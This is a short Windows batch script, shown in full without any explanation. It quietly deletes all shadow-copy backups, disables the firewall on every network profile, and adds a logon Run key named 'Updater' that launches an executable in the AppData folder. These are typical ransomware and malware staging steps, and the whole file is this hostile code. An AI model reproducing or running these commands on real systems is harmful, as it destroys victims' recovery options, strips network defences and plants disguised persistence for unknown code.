@echo off
vssadmin delete shadows /all /quiet
netsh advfirewall set allprofiles state off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /d "%APPDATA%\svc.exe"
